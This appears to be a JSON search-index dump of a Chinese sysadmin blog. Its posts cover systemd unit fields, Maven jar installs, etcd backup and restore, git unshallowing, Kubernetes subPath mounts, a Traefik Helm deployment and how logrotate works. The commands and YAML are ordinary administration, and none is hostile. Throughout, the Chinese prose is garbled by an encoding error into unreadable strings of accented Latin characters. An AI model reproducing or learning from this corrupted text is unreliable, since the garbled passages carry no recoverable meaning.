Type=notifyï¼šå½“å‰æœåŠ¡å¯åŠ¨å®Œæ¯•ï¼Œä¼šé€šçŸ¥Systemdï¼Œå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œ Type=idleï¼šè‹¥æœ‰å…¶ä»–ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œå½“å‰æœåŠ¡æ‰ä¼šè¿è¡Œ ExecStartï¼šå¯åŠ¨å½“å‰æœåŠ¡çš„å‘½ä»¤ ExecStartPreï¼šå¯åŠ¨å½“å‰æœåŠ¡ä¹‹å‰æ‰§è¡Œçš„å‘½ä»¤ ExecStartPostï¼šå¯åŠ¨å½“å‰æœåŠ¡ä¹‹åæ‰§è¡Œçš„å‘½ä»¤ ExecReloadï¼šé‡å¯å½“å‰æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤ ExecStopï¼šåœæ­¢å½“å‰æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤ ExecStopPostï¼šåœæ­¢å½“å…¶æœåŠ¡ä¹‹åæ‰§è¡Œçš„å‘½ä»¤ RestartSecï¼šè‡ªåŠ¨é‡å¯å½“å‰æœåŠ¡é—´éš”çš„ç§’æ•° Restartï¼šå®šä¹‰ä½•ç§æƒ…å†µ Systemd ä¼šè‡ªåŠ¨é‡å¯å½“å‰æœåŠ¡ï¼Œå¯èƒ½çš„å€¼åŒ…æ‹¬alwaysï¼ˆæ€»æ˜¯é‡å¯ï¼‰ã€on-successã€on-failureã€on-abnormalã€on-abortã€on-watchdog TimeoutSecï¼šå®šä¹‰ Systemd åœæ­¢å½“å‰æœåŠ¡ä¹‹å‰ç­‰å¾…çš„ç§’æ•° Environmentï¼šæŒ‡å®šç¯å¢ƒå˜é‡ Unit é…ç½®æ–‡ä»¶çš„å®Œæ•´å­—æ®µæ¸…å•ï¼Œè¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚ ","date":"2020-08-19 09:58","objectID":"/post/1921/:1:0","tags":["systemd"],"title":"systemdç®¡ç†æœåŠ¡--é…ç½®æ–‡ä»¶çš„å«ä¹‰","uri":"/post/1921/"},{"categories":["å¸¸ç”¨å‘½ä»¤"],"content":" mvn install:install-file -Dfile=./aspose-cells-8.5.2.jar -DgroupId=com.aspose -DartifactId=aspose-cells -Dversion=8.5.2 -Dpackaging=jar mvn install:install-file -Dfile=./aspose.slides-15.9.0.jar -DgroupId=com.aspose -DartifactId=aspose.slides -Dversion=15.9.0 -Dpackaging=jar mvn install:install-file -Dfile=./aspose-words-16.8.0-javadoc.jar -DgroupId=com.aspose -DartifactId=aspose-words-javadoc -Dversion=16.8.0 -Dpackaging=jar mvn install:install-file -Dfile=./aspose-words-16.8.0-jdk16.jar -DgroupId=com.aspose -DartifactId=aspose-words-jdk16 -Dversion=16.8.0 -Dpackaging=jar ","date":"2020-08-17 09:13","objectID":"/post/1916/:0:0","tags":["maven"],"title":"å®‰è£…jaråŒ…è‡³æœ¬åœ°ä»“åº“","uri":"/post/1916/"},{"categories":["kubernetes","databases"],"content":"å‘½ä»¤: etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key é›†ç¾¤èŠ‚ç‚¹åˆ—è¡¨ï¼š etcdå¤‡ä»½ï¼š ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key snapshot save 202008131304.db etcdæ¢å¤ï¼š ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key snapshot restore 202008131304.db ","date":"2020-08-17 09:12","objectID":"/post/1915/:0:0","tags":["k8s","etcd"],"title":"etcdå¤‡ä»½","uri":"/post/1915/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸæ–‡é“¾æ¥ï¼šhttps://mozillazg.com/2016/01/git-revert-depth-1.html æœ‰æ—¶æˆ‘ä»¬ä¸ºäº†åŠ å¿« clone çš„é€Ÿåº¦ä¼šä½¿ç”¨ â€“depth å‚æ•°ï¼Œæ¯”å¦‚ï¼š git clone https://xxx/xxx.git --depth 1 å¦‚æœæˆ‘ä»¬ä¹‹åè¦æŠŠä¹‹å‰çš„å†å²é‡æ–°å† pull ä¸‹æ¥å‘¢ï¼Ÿ æ¯”å¦‚è¦æŠŠæœ¬åœ°çš„ä»“åº“ push åˆ°ä¸€ä¸ªæ–°çš„ç©ºä»“åº“ï¼ˆ ä¼šå‡ºç° error: failed to push some refs é”™è¯¯ ï¼‰ã€‚ å¯ä»¥ä½¿ç”¨ â€“unshallow å‚æ•°ï¼š git pull --unshallow ","date":"2020-08-14 10:05","objectID":"/post/1913/:0:0","tags":["git"],"title":"git clone æ—¶ä½¿ç”¨äº† --depth åï¼Œå¦‚ä½•å†é‡æ–°æ‹‰å–å…¨éƒ¨çš„å†å²","uri":"/post/1913/"},{"categories":["kubernetes"],"content":"æœ‰ä¸¤ç§æƒ…å†µï¼š 1.åšä¸ºvolumesä½¿ç”¨æ—¶,subPathä»£è¡¨å­˜å‚¨å·çš„å­è·¯å¾„ï¼š apiVersion: v1 kind: Pod metadata: name: testpod0 spec: containers: - name: testc image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: data mountPath: /opt/data # æŒ‚è½½çš„è·¯å¾„ subPath: data # volumeçš„å­è·¯å¾„ - name: data mountPath: /opt/model subPath: model volumes: - name: data persistentVolumeClaim: claimName: test-data 2.ä½œä¸ºconfigmap/secretä½¿ç”¨æ—¶,subPathä»£è¡¨configmap/secretçš„å­è·¯å¾„ï¼š configmap: apiVersion: v1 kind: ConfigMap metadata: name: config-test data: config.ini: \"hello\" config.conf: \"nihao\" å•ç‹¬æŒ‚è½½ä¸€ä¸ªkeyä¸ºæ–‡ä»¶ï¼š apiVersion: v1 kind: Pod metadata: name: testpod spec: containers: - name: testc image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config.ini # æœ€ç»ˆåœ¨å®¹å™¨ä¸­çš„æ–‡ä»¶å subPath: config.ini #è¦æŒ‚è½½çš„confmapä¸­çš„keyçš„åç§° volumes: - name: config-test configMap: name: config-test æŒ‚è½½å¤šä¸ªkeyä¸ºæ–‡ä»¶ï¼š apiVersion: v1 kind: Pod metadata: name: testpod2 spec: containers: - name: testc image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config.ini # æœ€ç»ˆåœ¨å®¹å™¨ä¸­çš„æ–‡ä»¶å subPath: config.ini #è¦æŒ‚è½½çš„confmapä¸­çš„keyçš„åç§° - name: config-test mountPath: /etc/config.conf # æœ€ç»ˆåœ¨å®¹å™¨ä¸­çš„æ–‡ä»¶å subPath: config.conf #è¦æŒ‚è½½çš„confmapä¸­çš„keyçš„åç§° volumes: - name: config-test configMap: name: config-test å¤šä¸ªcontaineræŒ‚è½½ä¸åŒçš„keyï¼š apiVersion: v1 kind: Pod metadata: name: testpod1 spec: containers: - name: testc imagePullPolicy: Never image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config/config.ini subPath: config.ini - name: testc1 imagePullPolicy: Never image: busybox command: [\"/bin/sleep\",\"10000\"] volumeMounts: - name: config-test mountPath: /etc/config/config.conf subPath: config.conf volumes: - name: config-test configMap: name: config-test items: - key: config.ini path: config.ini - key: config.conf path: config.conf ","date":"2020-08-04 11:48","objectID":"/post/1911/:0:0","tags":["k8s"],"title":"k8sä¸­subpathçš„ä½¿ç”¨","uri":"/post/1911/"},{"categories":["kubernetes"],"content":"æ–¹å¼1:helmå®‰è£… 1.ç»™nodeæ·»åŠ æ ‡ç­¾ï¼Œæ–¹ä¾¿podè°ƒåº¦åˆ°æŒ‡å®šèŠ‚ç‚¹ kubectl label nodes k8s-node04 traefik=true 2.è‡ªå®šä¹‰èµ„æºæ¸…å•é…ç½® vim my_values.yaml # ä½¿ç”¨hostNetwork,serviceå°±ä¸éœ€è¦äº† service: enabled: false # traefikæ˜¯dashboardçš„é…ç½®ï¼Œwebå’Œwebsecureæ˜¯å…¥å£çš„é…ç½® ports: traefik: expose: false port: 9000 web: expose: false port: 80 websecure: expose: false port: 443 # ç›‘å¬1024ä»¥ä¸‹çš„ç«¯å£éœ€è¦ä¿®æ”¹traefiké»˜è®¤çš„å®‰å…¨ä¸Šä¸‹æ–‡é…ç½® securityContext: capabilities: drop: [] readOnlyRootFilesystem: false runAsGroup: 0 runAsNonRoot: false runAsUser: 0 # ä½¿ç”¨hostNetwork hostNetwork: true # æ§åˆ¶podè°ƒåº¦ nodeSelector: traefik: \"true\" 3.å®‰è£…traefik helm install traefik traefik/traefik --version=8.9.1 -f my_values.yaml 4.è·å–hostIP kubectl get pod -l app.kubernetes.io/name=traefik -o jsonpath={.items[0].status.hostIP};echo 5.åšå¥½è§£æåè®¿é—® httpå…¥å£: http://traefik.my.com/ httpså…¥å£: https://traefik.my.com/ dashboard: http://traefik.my.com:9000/dashboard/ ","date":"2020-07-31 10:43","objectID":"/post/1910/:0:0","tags":["k8s"],"title":"hostNetworkæ–¹å¼éƒ¨ç½²traefik2.2","uri":"/post/1910/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸæ–‡é“¾æ¥ï¼šhttps://www.lightxue.com/how-logrotate-works æ—¥å¿—å®åœ¨æ˜¯å¤ªæœ‰ç”¨äº†ï¼Œå®ƒè®°å½•äº†ç¨‹åºè¿è¡Œæ—¶å„ç§ä¿¡æ¯ã€‚é€šè¿‡æ—¥å¿—å¯ä»¥åˆ†æç”¨æˆ·è¡Œä¸ºï¼Œè®°å½•è¿è¡Œè½¨è¿¹ï¼ŒæŸ¥æ‰¾ç¨‹åºé—®é¢˜ã€‚å¯æƒœç£ç›˜çš„ç©ºé—´æ˜¯æœ‰é™çš„ï¼Œå°±åƒé£æœºé‡Œçš„é»‘åŒ£å­ï¼Œè®°å½•çš„ä¿¡æ¯å†é‡è¦ä¹Ÿåªèƒ½è®°å½•æœ€åä¸€æ®µæ—¶é—´å‘ç”Ÿçš„äº‹ã€‚ä¸ºäº†èŠ‚çœç©ºé—´å’Œæ•´ç†æ–¹ä¾¿ï¼Œæ—¥å¿—æ–‡ä»¶ç»å¸¸éœ€è¦æŒ‰æ—¶é—´æˆ–å¤§å°ç­‰ç»´åº¦åˆ†æˆå¤šä»½ï¼Œåˆ é™¤æ—¶é—´ä¹…è¿œçš„æ—¥å¿—æ–‡ä»¶ã€‚è¿™å°±æ˜¯é€šå¸¸è¯´çš„æ—¥å¿—æ»šåŠ¨(log rotation)ã€‚ æœ€è¿‘æ•´ç†nginxæ—¥å¿—ï¼Œç”¨äº†ä¸€ä¸ªç±»Unixç³»ç»Ÿä¸Šçš„å¤è€å·¥å…·â€”â€”logrotateï¼Œå‘ç°æ„å¤–çš„å¥½ç”¨ã€‚æƒ³äº†è§£è¿™ä¸ªå·¥å…·çš„ç”¨æ³•æ¨èçœ‹è¿™é‡Œã€‚æˆ‘äº†è§£äº†ä¸€ä¸‹è¿™ä¸ªå·¥å…·çš„è¿è¡Œæœºåˆ¶å’ŒåŸç†ï¼Œè§‰å¾—æŒºæœ‰è¶£çš„ã€‚ ","date":"2020-07-28 17:25","objectID":"/post/1903/:0:1","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"è¿è¡Œæœºåˆ¶ logrotateåœ¨å¾ˆå¤šLinuxå‘è¡Œç‰ˆä¸Šéƒ½æ˜¯é»˜è®¤å®‰è£…çš„ã€‚ç³»ç»Ÿä¼šå®šæ—¶è¿è¡Œlogrotateï¼Œä¸€èˆ¬æ˜¯æ¯å¤©ä¸€æ¬¡ã€‚ç³»ç»Ÿæ˜¯è¿™ä¹ˆå®ç°æŒ‰å¤©æ‰§è¡Œçš„ã€‚crontabä¼šæ¯å¤©å®šæ—¶æ‰§è¡Œ/etc/cron.dailyç›®å½•ä¸‹çš„è„šæœ¬ï¼Œè€Œè¿™ä¸ªç›®å½•ä¸‹æœ‰ä¸ªæ–‡ä»¶å«logrotateã€‚åœ¨centosä¸Šè„šæœ¬å†…å®¹æ˜¯è¿™æ ·çš„ï¼š /usr/sbin/logrotate /etc/logrotate.conf \u003e/dev/null 2\u003e\u00261 EXITVALUE=$? if [ $EXITVALUE != 0 ]; then /usr/bin/logger -t logrotate \"ALERT exited abnormally with [$EXITVALUE]\" fi exit 0 å¯ä»¥çœ‹åˆ°è¿™ä¸ªè„šæœ¬ä¸»è¦åšçš„äº‹å°±æ˜¯ä»¥/etc/logrotate.confä¸ºé…ç½®æ–‡ä»¶æ‰§è¡Œäº†logrotateã€‚å°±æ˜¯è¿™æ ·å®ç°äº†æ¯å¤©æ‰§è¡Œä¸€æ¬¡logrotateã€‚ å› ä¸ºæˆ‘çš„ç³»ç»Ÿæ‰§è¡Œ/etc/cron.dailyç›®å½•ä¸‹çš„è„šæœ¬ä¸æ˜¯æˆ‘æƒ³æ»šåŠ¨æ—¥å¿—çš„æ—¶é—´ï¼Œæ‰€ä»¥æˆ‘æŠŠ/etc/cron.daily/logrotateæ‹·äº†å‡ºæ¥ï¼Œæ”¹äº†ä¸€ä¸‹logrotateé…ç½®æ–‡ä»¶çš„è·¯å¾„ï¼Œç„¶ååœ¨crontabé‡ŒåŠ ä¸Šä¸€æ¡æŒ‡å®šæ—¶é—´æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„è®°å½•ï¼Œè‡ªå®šä¹‰å‘¨æœŸæ»šåŠ¨æ—¥å¿—å°±å¤§åŠŸå‘Šæˆäº†ã€‚è¿™ç§è‡ªå®šä¹‰çš„æ–¹å¼æœ‰ä¸¤ç‚¹è¦æ³¨æ„ï¼š é…ç½®æ–‡ä»¶é‡Œä¸€å®šè¦é…ç½®rotate æ–‡ä»¶æ•°ç›®è¿™ä¸ªå‚æ•°ã€‚å¦‚æœä¸é…ç½®é»˜è®¤æ˜¯0ä¸ªï¼Œä¹Ÿå°±æ˜¯åªå…è®¸å­˜åœ¨ä¸€ä»½æ—¥å¿—ï¼Œåˆšåˆ‡åˆ†å‡ºæ¥çš„æ—¥å¿—ä¼šé©¬ä¸Šè¢«åˆ é™¤ã€‚å¤šä¹ˆç—›çš„é¢†æ‚Ÿï¼Œè¯´å¤šäº†éƒ½æ˜¯æ³ªã€‚ æ‰§è¡Œlogrotateå‘½ä»¤æœ€å¥½åŠ -få‚æ•°ï¼Œä¸ç„¶æœ‰æ—¶å€™é…ç½®æ–‡ä»¶ä¿®æ”¹çš„å†…å®¹ä¸ç”Ÿæ•ˆã€‚ å¾ˆå¤šç¨‹åºçš„ä¼šç”¨åˆ°logrotateæ»šåŠ¨æ—¥å¿—ï¼Œæ¯”å¦‚nginxã€‚å®ƒä»¬å®‰è£…åï¼Œä¼šåœ¨/etc/logrotate.dè¿™ä¸ªç›®å½•ä¸‹å¢åŠ è‡ªå·±çš„logrotateçš„é…ç½®æ–‡ä»¶ã€‚logrotateä»€ä¹ˆæ—¶å€™æ‰§è¡Œ/etc/logrotate.dä¸‹çš„é…ç½®å‘¢ï¼Ÿçœ‹åˆ°/etc/logrotate.confé‡Œè¿™è¡Œï¼Œä¸€åˆ‡å°±ä¸è¨€è€Œå–»äº†ã€‚ include /etc/logrotate.d ","date":"2020-07-28 17:25","objectID":"/post/1903/:1:0","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸç† logrotateæ˜¯æ€ä¹ˆåšåˆ°æ»šåŠ¨æ—¥å¿—æ—¶ä¸å½±å“ç¨‹åºæ­£å¸¸çš„æ—¥å¿—è¾“å‡ºå‘¢ï¼Ÿlogrotateæä¾›äº†ä¸¤ç§è§£å†³æ–¹æ¡ˆã€‚ ","date":"2020-07-28 17:25","objectID":"/post/1903/:2:0","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"Linuxæ–‡ä»¶æ“ä½œæœºåˆ¶ ä»‹ç»ä¸€ä¸‹ç›¸å…³çš„Linuxä¸‹çš„æ–‡ä»¶æ“ä½œæœºåˆ¶ã€‚ Linuxæ–‡ä»¶ç³»ç»Ÿé‡Œæ–‡ä»¶å’Œæ–‡ä»¶åçš„å…³ç³»å¦‚ä¸‹å›¾ã€‚ 47492-vv62htw8w9.png ç›®å½•ä¹Ÿæ˜¯æ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œå­˜ç€æ–‡ä»¶åå’Œå¯¹åº”çš„inodeç¼–å·ã€‚é€šè¿‡è¿™ä¸ªinodeç¼–å·å¯ä»¥æŸ¥åˆ°æ–‡ä»¶çš„å…ƒæ•°æ®å’Œæ–‡ä»¶å†…å®¹ã€‚æ–‡ä»¶çš„å…ƒæ•°æ®æœ‰å¼•ç”¨è®¡æ•°ã€æ“ä½œæƒé™ã€æ‹¥æœ‰è€…IDã€åˆ›å»ºæ—¶é—´ã€æœ€åä¿®æ”¹æ—¶é—´ç­‰ç­‰ã€‚æ–‡ä»¶ä»¶åå¹¶ä¸åœ¨å…ƒæ•°æ®é‡Œè€Œæ˜¯åœ¨ç›®å½•æ–‡ä»¶ä¸­ã€‚å› æ­¤æ–‡ä»¶æ”¹åã€ç§»åŠ¨ï¼Œéƒ½ä¸ä¼šä¿®æ”¹æ–‡ä»¶ï¼Œè€Œæ˜¯ä¿®æ”¹ç›®å½•æ–‡ä»¶ã€‚ å€Ÿã€ŠUNIXç¯å¢ƒé«˜çº§ç¼–ç¨‹ã€‹é‡Œçš„å›¾è¯´ä¸€ä¸‹è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æœºåˆ¶ã€‚ 44632-1y2dd53q4f3.png è¿›ç¨‹æ¯æ–°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ç»™è¿™ä¸ªæ–‡ä»¶ã€‚æ–‡ä»¶æè¿°ç¬¦å¯¹åº”ç€ä¸€ä¸ªæ–‡ä»¶è¡¨ã€‚è¡¨é‡Œé¢å­˜ç€æ–‡ä»¶çš„çŠ¶æ€ä¿¡æ¯ï¼ˆO_APPEND/O_CREAT/O_DIRECTâ€¦ï¼‰ã€å½“å‰æ–‡ä»¶ä½ç½®å’Œæ–‡ä»¶çš„inodeä¿¡æ¯ã€‚ç³»ç»Ÿä¼šä¸ºæ¯ä¸ªè¿›ç¨‹åˆ›å»ºç‹¬ç«‹çš„æ–‡ä»¶æè¿°ç¬¦å’Œæ–‡ä»¶è¡¨ï¼Œä¸åŒè¿›ç¨‹æ˜¯ä¸ä¼šå…±ç”¨åŒä¸€ä¸ªæ–‡ä»¶è¡¨ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œä¸åŒè¿›ç¨‹å¯ä»¥åŒæ—¶ç”¨ä¸åŒçš„çŠ¶æ€æ“ä½œåŒä¸€ä¸ªæ–‡ä»¶çš„ä¸åŒä½ç½®ã€‚æ–‡ä»¶è¡¨ä¸­å­˜çš„æ˜¯inodeä¿¡æ¯è€Œä¸æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥æ–‡ä»¶è·¯å¾„å‘ç”Ÿæ”¹å˜ä¸ä¼šå½±å“æ–‡ä»¶æ“ä½œã€‚ ","date":"2020-07-28 17:25","objectID":"/post/1903/:2:1","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ–¹æ¡ˆ1ï¼šcreate é»˜è®¤æ–¹æ¡ˆæ²¡æœ‰åå­—ï¼Œå§‘ä¸”å«å®ƒcreateå§ã€‚å› ä¸ºè¿™ä¸ªæ–¹æ¡ˆä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ—¥å¿—æ–‡ä»¶ç»™ç¨‹åºè¾“å‡ºæ—¥å¿—ï¼Œè€Œä¸”ç¬¬äºŒä¸ªæ–¹æ¡ˆåcopytruncateæ˜¯ä¸ªé…ç½®é¡¹ï¼Œä¸createé…ç½®é¡¹æ˜¯äº’æ–¥çš„ã€‚ è¿™ä¸ªæ–¹æ¡ˆçš„æ€è·¯æ˜¯é‡å‘½ååŸæ—¥å¿—æ–‡ä»¶ï¼Œåˆ›å»ºæ–°çš„æ—¥å¿—æ–‡ä»¶ã€‚è¯¦ç»†æ­¥éª¤å¦‚ä¸‹ï¼š é‡å‘½åç¨‹åºå½“å‰æ­£åœ¨è¾“å‡ºæ—¥å¿—çš„ç¨‹åºã€‚å› ä¸ºé‡å‘½ååªä¼šä¿®æ”¹ç›®å½•æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œè¿›ç¨‹æ“ä½œæ–‡ä»¶é çš„æ˜¯inodeç¼–å·ï¼Œæ‰€ä»¥å¹¶ä¸å½±å“ç¨‹åºç»§ç»­è¾“å‡ºæ—¥å¿—ã€‚ åˆ›å»ºæ–°çš„æ—¥å¿—æ–‡ä»¶ï¼Œæ–‡ä»¶åå’ŒåŸæ¥æ—¥å¿—æ–‡ä»¶ä¸€æ ·ã€‚è™½ç„¶æ–°çš„æ—¥å¿—æ–‡ä»¶å’ŒåŸæ¥æ—¥å¿—æ–‡ä»¶çš„åå­—ä¸€æ ·ï¼Œä½†æ˜¯inodeç¼–å·ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ç¨‹åºè¾“å‡ºçš„æ—¥å¿—è¿˜æ˜¯å¾€åŸæ—¥å¿—æ–‡ä»¶è¾“å‡ºã€‚ é€šè¿‡æŸäº›æ–¹å¼é€šçŸ¥ç¨‹åºï¼Œé‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ã€‚ç¨‹åºé‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œé çš„æ˜¯æ–‡ä»¶è·¯å¾„è€Œä¸æ˜¯inodeç¼–å·ï¼Œæ‰€ä»¥æ‰“å¼€çš„æ˜¯æ–°çš„æ—¥å¿—æ–‡ä»¶ã€‚ ä»€ä¹ˆæ–¹å¼é€šçŸ¥ç¨‹åºæˆ‘é‡æ–°æ‰“å¼€æ—¥å¿—å‘¢ï¼Œç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯æ€æ­»è¿›ç¨‹é‡æ–°æ‰“å¼€ã€‚å¾ˆå¤šåœºæ™¯è¿™ç§ä½œæ³•ä¼šå½±å“åœ¨çº¿çš„æœåŠ¡ï¼Œäºæ˜¯æœ‰äº›ç¨‹åºæä¾›äº†é‡æ–°æ‰“å¼€æ—¥å¿—çš„æ¥å£ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡ä¿¡å·é€šçŸ¥nginxã€‚å„ç§IPCæ–¹å¼éƒ½å¯ä»¥ï¼Œå‰ææ˜¯ç¨‹åºè‡ªèº«è¦æ”¯æŒè¿™ä¸ªåŠŸèƒ½ã€‚ æœ‰ä¸ªåœ°æ–¹å€¼å¾—ä¸€æï¼Œä¸€ä¸ªç¨‹åºå¯èƒ½è¾“å‡ºäº†å¤šä¸ªéœ€è¦æ»šåŠ¨çš„æ—¥å¿—æ–‡ä»¶ã€‚æ¯æ»šåŠ¨ä¸€ä¸ªå°±é€šçŸ¥ç¨‹åºé‡æ–°æ‰“å¼€æ‰€æœ‰æ—¥å¿—æ–‡ä»¶ä¸å¤ªåˆ’å¾—æ¥ã€‚æœ‰ä¸ªsharedscriptsçš„å‚æ•°ï¼Œè®©ç¨‹åºæŠŠæ‰€æœ‰æ—¥å¿—éƒ½é‡å‘½åäº†ä»¥åï¼Œåªé€šçŸ¥ä¸€æ¬¡ã€‚ ","date":"2020-07-28 17:25","objectID":"/post/1903/:3:0","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ–¹æ¡ˆ2ï¼šcopytruncate å¦‚æœç¨‹åºä¸æ”¯æŒé‡æ–°æ‰“å¼€æ—¥å¿—çš„åŠŸèƒ½ï¼Œåˆä¸èƒ½ç²—æš´åœ°é‡å¯ç¨‹åºï¼Œæ€ä¹ˆæ»šåŠ¨æ—¥å¿—å‘¢ï¼Ÿcopytruncateçš„æ–¹æ¡ˆå‡ºåœºäº†ã€‚ è¿™ä¸ªæ–¹æ¡ˆçš„æ€è·¯æ˜¯æŠŠæ­£åœ¨è¾“å‡ºçš„æ—¥å¿—æ‹·(copy)ä¸€ä»½å‡ºæ¥ï¼Œå†æ¸…ç©º(trucate)åŸæ¥çš„æ—¥å¿—ã€‚è¯¦ç»†æ­¥éª¤å¦‚ä¸‹ï¼š æ‹·è´ç¨‹åºå½“å‰æ­£åœ¨è¾“å‡ºçš„æ—¥å¿—æ–‡ä»¶ï¼Œä¿å­˜æ–‡ä»¶åä¸ºæ»šåŠ¨ç»“æœæ–‡ä»¶åã€‚è¿™æœŸé—´ç¨‹åºç…§å¸¸è¾“å‡ºæ—¥å¿—åˆ°åŸæ¥çš„æ–‡ä»¶ä¸­ï¼ŒåŸæ¥çš„æ–‡ä»¶åä¹Ÿæ²¡æœ‰å˜ã€‚ æ¸…ç©ºç¨‹åºæ­£åœ¨è¾“å‡ºçš„æ—¥å¿—æ–‡ä»¶ã€‚æ¸…ç©ºåç¨‹åºè¾“å‡ºçš„æ—¥å¿—è¿˜æ˜¯è¾“å‡ºåˆ°è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ï¼Œå› ä¸ºæ¸…ç©ºæ–‡ä»¶åªæ˜¯æŠŠæ–‡ä»¶çš„å†…å®¹åˆ é™¤äº†ï¼Œæ–‡ä»¶çš„inodeç¼–å·å¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œå˜åŒ–çš„æ˜¯å…ƒä¿¡æ¯ä¸­æ–‡ä»¶å†…å®¹çš„ä¿¡æ¯ã€‚ ç»“æœä¸Šçœ‹ï¼Œæ—§çš„æ—¥å¿—å†…å®¹å­˜åœ¨æ»šåŠ¨çš„æ–‡ä»¶é‡Œï¼Œæ–°çš„æ—¥å¿—è¾“å‡ºåˆ°ç©ºçš„æ–‡ä»¶é‡Œã€‚å®ç°äº†æ—¥å¿—çš„æ»šåŠ¨ã€‚ ","date":"2020-07-28 17:25","objectID":"/post/1903/:4:0","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"è¿™ä¸ªæ–¹æ¡ˆæœ‰ä¸¤ä¸ªæœ‰è¶£çš„åœ°æ–¹ã€‚ æ–‡ä»¶æ¸…ç©ºå¹¶ä¸å½±å“åˆ°è¾“å‡ºæ—¥å¿—çš„ç¨‹åºçš„æ–‡ä»¶è¡¨é‡Œçš„æ–‡ä»¶ä½ç½®ä¿¡æ¯ï¼Œå› ä¸ºå„è¿›ç¨‹çš„æ–‡ä»¶è¡¨æ˜¯ç‹¬ç«‹çš„ã€‚é‚£ä¹ˆæ–‡ä»¶æ¸…ç©ºåï¼Œç¨‹åºè¾“å‡ºçš„æ—¥å¿—åº”è¯¥æ¥ç€ä¹‹å‰æ—¥å¿—çš„åç§»ä½ç½®è¾“å‡ºï¼Œè¿™ä¸ªä½ç½®ä¹‹å‰ä¼šè¢«\\0å¡«å……æ‰å¯¹ã€‚ä½†å®é™…ä¸Šlogroateæ¸…ç©ºæ—¥å¿—æ–‡ä»¶åï¼Œç¨‹åºè¾“å‡ºçš„æ—¥å¿—éƒ½æ˜¯ä»æ–‡ä»¶å¼€å§‹å¤„å¼€å§‹å†™çš„ã€‚è¿™æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿè¿™ä¸ªé—®é¢˜è®©æˆ‘çº ç»“äº†å¾ˆä¹…ï¼Œç›´åˆ°æŸå¤©çµå…‰ä¸€é—ªï¼Œè¿™ä¸æ˜¯logrotateåšçš„ï¼Œè€Œæ˜¯æˆç†Ÿçš„å†™æ—¥å¿—çš„æ–¹å¼ï¼Œéƒ½æ˜¯ç”¨O_APPENDçš„æ–¹å¼å†™çš„ã€‚å¦‚æœç¨‹åºæ²¡æœ‰ç”¨O_APPENDæ–¹å¼æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œå˜ä¼šå‡ºç°copytruncateåæ—¥å¿—æ–‡ä»¶å‰é¢ä¼šè¢«ä¸€å †\\0å¡«å……çš„æƒ…å†µã€‚ 